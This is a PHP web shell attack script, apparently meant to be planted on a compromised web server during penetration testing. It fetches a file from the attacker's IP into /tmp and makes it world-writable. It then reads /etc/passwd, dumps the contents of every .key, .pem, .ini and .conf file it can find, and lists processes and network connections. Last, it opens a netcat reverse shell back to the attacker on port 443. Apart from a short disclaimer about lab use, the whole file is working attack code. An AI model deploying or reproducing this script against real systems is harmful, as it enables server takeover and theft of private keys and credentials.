<?php

$remotefile = 'file.txt'; //Replace with the name of the file being replaced
$remotedir = "/tmp/"; //Replace with the directory of the file where being saved
$myip = '10.1.1.1'; //Use the IP address of your machine to the network hosting the victim machine
$mynetcatport = '443'; //Use the port number address of your machine with nc -nlvp 443
$myfile = 'file.txt'; //Name of file to upload
$url = 'http://'.$myip.'/'.$myfile; // URL of the file to download



$result = downloadFile($url,$remotedir,$remotefile);

if ($result == true)
{
	echo '<span style="color:#0D0;text-align:center;">Completed successfully</span>';
	echo "Running netcat return to our machine";
	$reverseshell = 'sh -c rm /tmp/z; mkfifo /tmp/z; cat /tmp/z | /bin/sh -i 2>&1 | nc '.$myip .' '. $mynetcatport.' > /tmp/z';
	echo "<pre>$reverseshell</pre>";
	$connect = exec($reverseshell);
	exit;   
}

else
{
    '<span style="color:#F00;text-align:center;">Something went wrong</span>';
    exit;
}

/**
* Function : Download a remote file at a given URL and save it to a local folder.
* false - if failed
* Originally downloaded from:
*  https://www.codercrunch.com/codelet/570508964/download-a-remote-file-at-a-url-and-save-it-locally-in-php
* Intended for legitimate use only such as offical pen test or lab use.
* You are an adult responsible for your actions or your parents. Be consequence aware
* Created by Emanuel Gomes (cybercoder.com.au) 2020
* Modifications include paramterizing local/remote files and IP
* Modification of true and false values to more information on status message
* Creation of print function to display output from commands
* Useful commands that can be used for machine enumeration
* 
*/

function printOutput($command) {
		
		// m to let it traverse multi-line
		echo "<pre></pre>";
		echo "Running command: ";
		echo "<pre></pre>";
		echo '<span style="color:#00F;text-align:center;">'.$command.'</span>';
		$output = shell_exec($command);

		if ($output == '') {
			echo "<pre></pre>";
			echo '<span style="color:#F80;text-align:center;"> No output. Likely no permission to run or no results. </span>';
			echo "<pre></pre>";
		}
		else
		{
			echo "<pre>$output</pre>"; 			
		}


}

function downloadFile($url,$toDir,$withName) {
    
    // open file in rb mode
    if ($fp_remote = fopen($url, 'rb')) {

		echo "The remote file to: ";
		echo $toDir;
		echo " in effect.";		
		echo "<pre></pre>";
	

		echo "Write operation is in effect with the name of: ";
		echo $withName;
		echo "<pre></pre>";

		// local filename
		$local_file = $toDir ."/" . $withName;
     
	 // read buffer, open in wb mode for writing
	if ($fp_local = fopen($local_file, 'wb')) {
            
		// read the file, buffer size 8k
		while ($buffer = fread($fp_remote, 18192)) {
		

			// write buffer in  local file
			fwrite($fp_local, $buffer);
		}
     
		// close local
		fclose($fp_local);
		echo "<pre></pre>";
		echo "Wrote changes to file successfully";
	

		chmod($local_file, 0777);
		echo "<pre></pre>";
		echo "Contents of /tmp/ folder if possible";
		$command = "ls -lhaR /tmp/";
		printOutput($command);

		echo "Contents of /home folder if possible";
		$command = "ls -lhaR /home";
		printOutput($command);

		echo "Contents of /etc/passwd file";
		$command = "cat /etc/passwd";
		printOutput($command);

		echo "Conf files of interest in /etc";
		$command = "ls -lhaR /etc/*.conf| grep .......r..";
		printOutput($command);

		echo "Finding World writeable files in /etc";
		$command = "ls -lhaR /etc | grep .......rw. | grep -v lrwx | grep -v srw. | grep -v drwx";
		printOutput($command);

		echo "Finding World writeable files in /var";
		$command = "ls -lhaR /var | grep .......rw. | grep -v lrwx | grep -v srw. | grep -v drwx";
		printOutput($command);

		echo "Finding World writeable files in /usr";
		$command = "ls -lhaR /var | grep .......rw. | grep -v lrwx | grep -v srw. | grep -v drwx";
		printOutput($command);

		echo "CONF files of interest in /";
		$command = "cd / && find -regex '.*\.\(conf\)'";
		printOutput($command);

		echo "List of packages installed if DEB based with APT";
		$command = "apt list";
		printOutput($command);

		echo "List of packages installed if RHEL based with YUM";
		$command = "yum list installed";
		printOutput($command);

		echo "CONF files of interest in /usr";
		$command = "cd /usr && find -regex '.*\.\(conf\)'";
		printOutput($command);

		echo "CONF files contents of interest in /usr";
		$command = "cd /usr && find -regex '.*\.\(conf\)' | xargs cat";
		printOutput($command);

		echo "INI files of interest in /";
		$command = "cd / && find -regex '.*\.\(ini\)'";
		printOutput($command);

		echo "INI files contents of interest in /";
		$command = "cd / && find -regex '.*\.\(ini\)' | xargs cat";
		printOutput($command);

		echo "KEY files of interest in /";
		$command = "cd / && find -regex '.*\.\(key\)'";
		printOutput($command);

		echo "KEY files contents of interest in /";
		$command = "cd / && find -regex '.*\.\(key\)' | xargs cat";
		printOutput($command);

		echo "PEM files of interest in /";
		$command = "cd / && find -regex '.*\.\(pem\)'";
		printOutput($command);

		echo "PEM files contents of interest in /";
		$command = "cd / && find -regex '.*\.\(pem\)' | xargs cat";
		printOutput($command);

		echo "Contents of /var/www folder if possible";
		$command = "ls -lhaR /var/www";
		printOutput($command);

		echo "Check running commands with ps -aux";
		$command = 'ps -aux';
		printOutput($command);

		echo "Running netstat command";
		$command = "netstat -putan";
		printOutput($command);

		return true;
        }
        else
        {
            // could not open the local URL
            fclose($fp_remote);
	    	echo " Could not open the local URL\n\r";	
            return false;    
        }

    }
    else
    {
        // could not open the remote URL
		echo " Could not open the remote URL\n\r";
        return false;
    }

} // end 
?>
